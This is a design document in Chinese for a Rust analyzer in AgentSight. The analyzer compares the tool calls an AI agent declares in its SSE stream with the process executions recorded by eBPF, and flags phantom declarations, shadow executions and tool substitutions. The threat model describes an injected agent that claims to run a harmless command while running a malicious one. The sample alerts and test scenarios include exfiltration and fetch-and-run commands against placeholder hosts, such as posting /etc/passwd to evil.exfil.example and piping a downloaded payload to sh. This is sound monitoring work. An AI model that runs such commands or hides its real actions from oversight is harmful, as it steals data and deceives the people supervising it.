# ToolExecutionIntegrityAnalyzer — 设计文档

> **作者**: lzkk
> **日期**: 2026-06-04
> **状态**: 设计阶段，待评审

## 1. 动机

在 AgentSight 的可观测数据中，存在两条独立的信息通道：

1. **SSE 流** — Agent 通过 SSE 向用户声明的意图（"我将执行 `ls` 列出文件"）
2. **Process 事件** — eBPF 捕获的实际进程行为（EXEC 事件显示 `curl evil.com`）

**没有任何现有分析器系统性地交叉验证这两条通道的一致性。** 攻击者如果控制了 Agent 的输出流（SSE），可以伪造声明内容，掩盖实际执行的恶意命令。

**ToolExecutionIntegrityAnalyzer** 填补这一空白，检测以下三类异常：

| 异常类型 | 描述 | 攻击场景 |
|----------|------|---------|
| **幻影声明** (Phantom Declaration) | SSE 中声明了工具调用，但在时间窗口内无对应 process EXEC 事件 | Agent 伪造输出，制造"正在工作"的假象，掩盖其窃取数据的真实行为 |
| **影子执行** (Shadow Execution) | Process EXEC 事件发生，但无对应的 SSE 声明 | Agent 执行未声明的命令，可能是注入的恶意载荷或越权操作 |
| **工具替换** (Tool Substitution) | SSE 声明执行工具 A，但实际执行的是工具 B | Agent 被注入后，谎称运行安全命令，实际执行恶意命令 |

### 与其他分析器的区别

| 分析器 | 关注点 | 本分析器 |
|--------|--------|----------|
| `HandoffInjectionAnalyzer` | 文件投毒→HTTP/SSE 接受标记 | 不检查声明与实际的一致性 |
| `AgentLoopDetector` | EXEC 事件循环模式 | 不交叉 SSE 内容 |
| `ConversationFlowAnalyzer` | 对话流模式异常 | 不关心进程事件 |
| **本分析器** | **SSE 声明 ↔ Process 执行的交叉完整性** | **唯一的跨通道验证器** |

## 2. 接口设计

### 2.1 Analyzer Trait 实现

```rust
/// 工具执行完整性分析器：交叉验证 Agent 声明的工具调用与实际进程执行，
/// 检测幻影声明、影子执行和工具替换攻击。
pub struct ToolExecutionIntegrityAnalyzer {
    /// 配置
    config: ToolExecutionIntegrityConfig,

    /// 按 agent_root_pid 维度的待验证声明队列
    /// 声明发出后，等待匹配的 process EXEC 事件
    pending_declarations: Arc<Mutex<HashMap<u32, VecDeque<PendingDeclaration>>>>,

    /// 按 agent_root_pid 维度的近期未声明 EXEC 事件
    /// EXEC 事件先于此缓存，等待后续 SSE 声明来匹配
    unannounced_execs: Arc<Mutex<HashMap<u32, VecDeque<UnannouncedExec>>>>,

    /// 全局去重冷却表
    dedup_cooldown: Arc<Mutex<HashMap<String, u64>>>,

    /// 进程拓扑 (pid → agent_root_pid)
    pid_to_root: Arc<Mutex<HashMap<u32, u32>>>,
}
```

### 2.2 配置类型

```rust
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ToolExecutionIntegrityConfig {
    /// 是否启用
    pub enabled: bool,

    /// SSE 声明后等待 EXEC 匹配的最大时间窗口 (纳秒)，默认 5s
    pub declaration_match_window_ns: u64,

    /// EXEC 事件等待 SSE 声明匹配的最大时间窗口 (纳秒)，默认 5s
    pub exec_match_window_ns: u64,

    /// 同一异常的全局去重冷却时间 (纳秒)，默认 60s
    pub dedup_cooldown_ns: u64,

    /// 每 agent 最大缓存的待验证声明数，默认 64
    pub max_pending_declarations_per_agent: usize,

    /// 每 agent 最大缓存的未声明 EXEC 数，默认 64
    pub max_unannounced_execs_per_agent: usize,

    /// 工具名称白名单（这些工具的声明与实际匹配不严格检查）
    /// 例如 ["echo", "cat", "pwd"] — 这些命令太通用，容易误匹配
    pub tool_name_allowlist: HashSet<String>,

    /// 是否启用模糊匹配（将 SSE 声明中的命令名与 EXEC 命令名进行编辑距离匹配）
    pub enable_fuzzy_matching: bool,

    /// 模糊匹配的最大编辑距离，默认 2
    pub fuzzy_match_max_distance: usize,
}

impl Default for ToolExecutionIntegrityConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            declaration_match_window_ns: 5_000_000_000,  // 5s
            exec_match_window_ns: 5_000_000_000,          // 5s
            dedup_cooldown_ns: 60_000_000_000,            // 60s
            max_pending_declarations_per_agent: 64,
            max_unannounced_execs_per_agent: 64,
            tool_name_allowlist: HashSet::from([
                "echo".into(), "cat".into(), "pwd".into(),
                "ls".into(), "true".into(), "false".into(),
            ]),
            enable_fuzzy_matching: true,
            fuzzy_match_max_distance: 2,
        }
    }
}
```

### 2.3 内部状态类型

```rust
/// 待验证的 SSE 声明
struct PendingDeclaration {
    /// 声明的时间戳
    timestamp_ns: u64,
    /// 声明的工具名称（从 SSE text 中提取的命令名）
    declared_tool: String,
    /// 声明时的完整 SSE text_content（用于审计）
    sse_text_excerpt: String,
    /// 是否已被匹配
    matched: bool,
}

/// 未声明的 EXEC 事件
struct UnannouncedExec {
    /// EXEC 时间戳
    timestamp_ns: u64,
    /// 实际执行的命令路径
    executed_path: String,
    /// 完整命令行
    full_command: String,
    /// 是否已被匹配
    matched: bool,
}
```

### 2.4 Analyzer trait

```rust
#[async_trait]
impl Analyzer for ToolExecutionIntegrityAnalyzer {
    /// 输入: sse_processor + process 事件流
    /// 输出: 原始事件 + tool_execution_integrity 告警事件
    async fn process(&mut self, stream: EventStream) -> Result<EventStream, AnalyzerError>;

    fn name(&self) -> &str {
        "ToolExecutionIntegrityAnalyzer"
    }
}
```

## 3. 数据流

```
EventStream (sse_processor, process)
  │
  ▼  stream.filter_map(move |event|)
  │
  ├── 非关注 source → 直接透传 (Some(event))
  │
  ├── source == "sse_processor":
  │     ├── 从 event.data.text_content 提取声明的工具名称
  │     │   └── 使用 NLP 启发式:
  │     │       - 正则: "I('ll| will) (run|use|execute|call|invoke) [`]?(\w+)[`]?"
  │     │       - 正则: "Tool: (\w+)" / "tool_call: (\w+)"
  │     │       - 正则: "```(\w+)"
  │     │       - Fallback: 提取所有反引号包裹的看起来像命令的词
  │     ├── 获取 agent_root_pid
  │     ├── 创建 PendingDeclaration，插入 pending_declarations
  │     ├── 反向匹配: 遍历 unannounced_execs，查找匹配的 EXEC
  │     │   ├── 匹配成功 → 标记双方为 matched，不产生告警
  │     │   └── 无匹配 → 声明进入等待队列
  │     ├── 定时检查: 清理过期声明（超过 declaration_match_window_ns）
  │     │   └── 过期的未匹配声明 → 触发 PHANTOM_DECLARATION 告警
  │     └── 透传原始 sse_processor 事件
  │
  ├── source == "process":
  │     ├── 更新进程拓扑 (EXEC/EXIT 事件)
  │     ├── 只关注 event.data.event == "EXEC":
  │     │   ├── 从 event.data.filename 或 full_command 提取命令名
  │     │   ├── 获取 agent_root_pid
  │     │   ├── 创建 UnannouncedExec，插入 unannounced_execs
  │     │   ├── 正向匹配: 遍历 pending_declarations，查找匹配的声明
  │     │   │   ├── 匹配成功 → 标记双方为 matched，不产生告警
  │     │   │   └── 无匹配 → EXEC 进入等待队列
  │     │   ├── 定时检查: 清理过期 EXEC（超过 exec_match_window_ns）
  │     │   │   └── 过期的未匹配 EXEC → 触发 SHADOW_EXECUTION 告警
  │     │   └── 透传原始 process 事件
  │     │
  │     └── 非 EXEC 事件 → 直接透传
  │
  └── 透传所有事件 + 插入告警事件
```

### 3.1 流式处理决策

**选择**: `.filter_map()` — 每个事件 1:1 或 1:N 转换（正常事件不变，异常时额外插入告警，EXEC 匹配时可能同时清理过期声明并发出告警）。

**理由**:
- 遵循现有模式（所有 20+ 分析器均采用 filter_map/map 模式）
- 双队列设计保证无界缓冲不会无限增长（`max_pending_declarations_per_agent` / `max_unannounced_execs_per_agent` 上限）
- `Arc<Mutex<>>` 锁持有时间 ~微秒级（HashSet 查找 + VecDeque push/pop + 字符串比较）

**替代方案已排除**:
- `.scan()` — 返回 `Option<B>` 限制了多事件输出的灵活性
- 全局事件缓冲 — 对无限实时流不可行

### 3.2 工具名称提取 (NLP 启发式)

SSE 文本中的工具声明格式多样，使用多层正则提取：

```rust
/// 从 SSE text_content 中提取声明的工具名称。
/// 返回 None 表示未检测到工具声明。
fn extract_declared_tool(text: &str) -> Option<String> {
    // 优先级 1: 显式工具调用语法
    let patterns = [
        // "I will run `curl`"
        r"I(?:'ll|\s+will)\s+(?:run|use|execute|call|invoke)\s+`(\w+)`",
        // "Tool: grep" / "tool_call: find"
        r"[Tt]ool(?:_call)?:\s*`?(\w+)`?",
        // "```bash\ncurl ..." → 提取语言标记后的命令
        r"```(\w+)",
        // "Running: cat file.txt" / "Executing: ls"
        r"(?:Running|Executing|Calling):\s*`?(\w+)`?",
    ];

    for pattern in &patterns {
        if let Some(captures) = Regex::new(pattern).ok()?.captures(text) {
            if let Some(tool) = captures.get(1) {
                let name = tool.as_str().to_lowercase();
                // 过滤太短或太长的匹配
                if name.len() >= 2 && name.len() <= 32 {
                    return Some(name);
                }
            }
        }
    }

    // Fallback: 查找反引号包裹的可能命令名
    if let Some(captures) = Regex::new(r"`([a-zA-Z][a-zA-Z0-9_-]{1,31})`")
        .ok()?
        .captures_iter(text)
        .filter_map(|c| c.get(1))
        .find(|m| {
            let s = m.as_str();
            // 排除常见非命令词
            !matches!(s, "true" | "false" | "null" | "file" | "path" | "data")
        })
    {
        return Some(captures.as_str().to_lowercase());
    }

    None
}
```

### 3.3 工具名称匹配逻辑

```rust
/// 判断声明的工具是否与实际执行的命令匹配。
fn tools_match(declared: &str, executed_path: &str, config: &ToolExecutionIntegrityConfig) -> bool {
    // 提取可执行文件的基名
    let exec_name = std::path::Path::new(executed_path)
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or(executed_path)
        .to_lowercase();

    // 精确匹配
    if declared == exec_name {
        return true;
    }

    // 常见别名映射
    let aliases: &[( &str, &[&str] )] = &[
        ("python", &["python3", "python2"]),
        ("node",   &["nodejs"]),
        ("sh",     &["bash", "dash", "zsh"]),
        ("curl",   &["wget"]),
        ("grep",   &["rg", "ack"]),
        ("find",   &["fd"]),
        ("cat",    &["bat"]),
        ("ls",     &["exa", "eza"]),
    ];

    for (canonical, aliases_list) in aliases {
        if (declared == *canonical && aliases_list.contains(&exec_name.as_str()))
            || (exec_name == *canonical && aliases_list.contains(&declared.as_str()))
        {
            return true;
        }
    }

    // 模糊匹配 (编辑距离)
    if config.enable_fuzzy_matching {
        let distance = edit_distance(declared, &exec_name);
        if distance <= config.fuzzy_match_max_distance {
            return true;
        }
    }

    false
}
```

### 3.4 告警事件 Schema

#### PHANTOM_DECLARATION 告警

```json
{
  "source": "tool_execution_integrity",
  "event_type": "PHANTOM_DECLARATION",
  "timestamp": 1717430000000000,
  "pid": 301,
  "comm": "worker",
  "data": {
    "anomaly_type": "phantom_declaration",
    "agent_root_pid": 300,
    "declared_tool": "ls",
    "sse_text_excerpt": "I will run `ls` to list the directory contents...",
    "declaration_timestamp_ns": 1717430000000000,
    "window_expired_at_ns": 1717430005000000,
    "pending_execs_seen_in_window": ["echo", "cat"],
    "severity": "medium",
    "detail": "Agent agent-300 declared tool 'ls' in SSE but no matching process EXEC event observed within 5s window. 2 unrelated EXEC events occurred."
  }
}
```

#### SHADOW_EXECUTION 告警

```json
{
  "source": "tool_execution_integrity",
  "event_type": "SHADOW_EXECUTION",
  "timestamp": 1717430010000000,
  "pid": 302,
  "comm": "bash",
  "data": {
    "anomaly_type": "shadow_execution",
    "agent_root_pid": 300,
    "executed_path": "/usr/bin/curl",
    "full_command": "curl -X POST https://evil.exfil.example/data -d @/etc/passwd",
    "exec_timestamp_ns": 1717430010000000,
    "pending_declarations_in_window": [],
    "severity": "high",
    "detail": "Agent agent-300 executed '/usr/bin/curl' without any corresponding SSE declaration within 5s window. No tool declarations were observed."
  }
}
```

#### TOOL_SUBSTITUTION 告警

```json
{
  "source": "tool_execution_integrity",
  "event_type": "TOOL_SUBSTITUTION",
  "timestamp": 1717430020000000,
  "pid": 303,
  "comm": "sh",
  "data": {
    "anomaly_type": "tool_substitution",
    "agent_root_pid": 300,
    "declared_tool": "ls",
    "executed_path": "/usr/bin/curl",
    "full_command": "curl -s https://evil.example/payload | sh",
    "sse_text_excerpt": "I'll run `ls` to check the directory...",
    "severity": "critical",
    "detail": "Agent agent-300 declared 'ls' but executed 'curl'. Declared-vs-actual tool mismatch is critical — potential tool substitution attack."
  }
}
```

## 4. Pipeline 集成

### 4.1 阶段定位

`PipelineStage::AnomalyDetection` (stage 3) — 位于 InjectionDetection (stage 2) 之后。

**理由**: 需要已处理的 SSE（`sse_processor` 来源）和 process 事件，但不需要等待 AlertEnrichment。它属于异常检测层，输出告警供下游消费。

### 4.2 事件消费/生产契约

| 维度 | 值 |
|------|-----|
| **消费** | `sse_processor`, `process` |
| **生产** | `tool_execution_integrity` (告警)，原始事件透传 |
| **阶段** | `PipelineStage::AnomalyDetection` |
| **前置依赖** | Preprocessing (SSEProcessor, TimestampNormalizer) |

### 4.3 注册方式

```rust
// 在 AgentRunner 或 pipeline builder 中:
agent = agent.add_global_analyzer(Box::new(
    ToolExecutionIntegrityAnalyzer::new(ToolExecutionIntegrityConfig::default())
));
```

### 4.4 EventSource 扩展

需要向 `EventSource` 枚举新增一个变体：

```rust
pub enum EventSource {
    // ... existing variants ...
    /// 工具执行完整性验证告警
    ToolExecutionIntegrity,
}
```

对应的 `as_str()`: `"tool_execution_integrity"`

## 5. 与现有 Analyzer 的关系

```
Preprocessing (stage 0)
  ├── SSEProcessor          ← 产生 sse_processor 事件
  └── (其他预处理器)
       │
InjectionDetection (stage 2)
  └── HandoffInjectionAnalyzer
       │
AnomalyDetection (stage 3)
  ├── MultiAgentAnomalyAnalyzer
  ├── ContextPollutionAnalyzer
  ├── ConversationFlowAnalyzer
  ├── ToolExecutionIntegrityAnalyzer  ← **新增**
  │    消费: sse_processor, process
  │    生产: tool_execution_integrity
  └── (其他异常检测器)
       │
AlertEnrichment (stage 4)
  └── AlertEnrichmentAnalyzer ← 消费 tool_execution_integrity 并归并
       │
Output (stage 5)
```

## 6. 测试策略

### 单元测试

| 测试 | 验证内容 |
|------|----------|
| `declared_tool_matches_exec_no_alert` | SSE 声明 `ls`，对应 EXEC `/bin/ls` → 不产生告警 |
| `declared_tool_with_alias_matches` | SSE 声明 `python`，EXEC `python3` → 别名匹配，不产生告警 |
| `phantom_declaration_timeout` | SSE 声明 `curl`，5s 内无 EXEC → PHANTOM_DECLARATION 告警 |
| `shadow_execution_detected` | EXEC `/usr/bin/nc`，无 SSE 声明 → SHADOW_EXECUTION 告警 |
| `tool_substitution_detected` | SSE 声明 `ls`，EXEC `/usr/bin/curl` → TOOL_SUBSTITUTION 告警 |
| `declaration_then_exec_match` | SSE 声明 → 1s 后 EXEC 出现 → 匹配成功，无告警 |
| `exec_then_declaration_match` | EXEC → 2s 后 SSE 声明出现 → 反向匹配成功，无告警 |
| `dedup_cooldown_respected` | 60s 内同 agent 同类型异常不重复告警 |
| `tool_name_allowlist_skipped` | 白名单中的工具不参与严格匹配 |
| `fuzzy_match_recovery` | 编辑距离 ≤ 2 的模糊匹配视为成功 |
| `child_process_attributed_to_root` | 子进程的 EXEC 正确归因到 agent_root_pid |
| `non_target_sources_passthrough` | ssl、system 等非关注事件直接透传 |
| `max_pending_bound_respected` | 超过 max_pending 时旧声明被驱逐 |
| `extract_declared_tool_patterns` | 各种 SSE 声明格式都能正确提取工具名 |

### 集成测试场景

1. **正常 Agent 工作流**: Agent 声明 `grep` → EXEC `grep` → 声明 `cat` → EXEC `cat` → 0 条告警
2. **影子执行攻击**: Agent 的 SSE 流正常 → 后台 EXEC 了 `curl evil.com` → 1 条 SHADOW_EXECUTION 告警 (severity: high)
3. **工具替换攻击**: Agent 声明 `ls` → 实际执行 `curl | sh` → 1 条 TOOL_SUBSTITUTION 告警 (severity: critical)
4. **多 Agent 并存**: Agent A 和 Agent B 各自独立声明和执行 → 无交叉匹配，各自归因正确
5. **高频命令场景**: Agent 快速连续执行 100 个命令 → 声明和执行的匹配正确，无虚假告警

## 7. 风险与缓解

| 风险 | 影响 | 缓解 |
|------|------|------|
| **SSE 文本中工具名提取失败** | 声明方队列为空 → 无法匹配 → 影子执行误报增多 | 多层正则 fallback；静态分析 SSE JSON 中的显式 tool_call 字段（若存在） |
| **高吞吐下双队列膨胀** | 内存泄漏 | `max_pending_declarations_per_agent` / `max_unannounced_execs_per_agent` 硬上限；超限时 FIFO 驱逐最旧条目 |
| **合法命令使用别名** | 误报工具替换 | 别名映射表 + 编辑距离模糊匹配；可配置 `enable_fuzzy_matching = false` 关闭 |
| **Agent 声明中描述多个工具** | 一个声明匹配多个 EXEC 时的歧义 | 按时间顺序贪婪匹配——声明匹配最近的 EXEC |
| **eBPF 事件丢失导致 EXEC 缺失** | 幻影声明误报 | 告警 severity 为 "medium"（而非 high/critical）；在告警 detail 中注明可能存在事件丢失 |
| **白名单命令产生漏报** | 攻击者伪造成白名单命令 (`echo` 管道) | 白名单仅用于跳过匹配验证，不跳过 EXEC 事件记录；影子执行检测仍然覆盖白名单命令 |
| **模糊匹配过于宽松** | 不同命令被错误匹配 | `fuzzy_match_max_distance = 2` 且只生效于编辑距离接近的词；别名优先于模糊匹配 |

## 8. 待决策事项

1. **SSE 中的显式 tool_call 字段**: 如果 SSEProcessor 未来在事件中添加了显式的 `tool_name` / `tool_call` 字段，本分析器应优先使用该结构化字段而非 NLP 启发式提取。

2. **与 SemanticObserverAnalyzer 的集成**: 是否让 SemanticObserver 为本分析器提供工具声明提取的 LLM 侧验证？当前设计采用纯启发式以保证延迟和吞吐。

3. **告警 severity 的动态调整**: 如果影子执行的目标是 `/usr/bin/curl` 且参数包含已知外泄域名模式，是否应自动升级为 critical？可以与 `data_exfiltration_detector` 共享模式库。

4. **Agent IDE 场景中的 tool_use 格式**: Claude Code 等 IDE 模式下，SSE 内容可能包含 `tool_use` JSON 块——应优先解析这些结构化块。

---

**请团队成员评审以上设计，重点关注**:
- 双队列匹配算法的时间顺序贪心策略是否合理
- 工具声明提取的 NLP 启发式是否覆盖了足够的 SSE 文本格式
- 与其他 AnomalyDetection 阶段分析器的协调（尤其是 `ConversationFlowAnalyzer` 和 `AgentLoopDetector`）
- `EventSource::ToolExecutionIntegrity` 新增是否与现有 pipeline 合约兼容
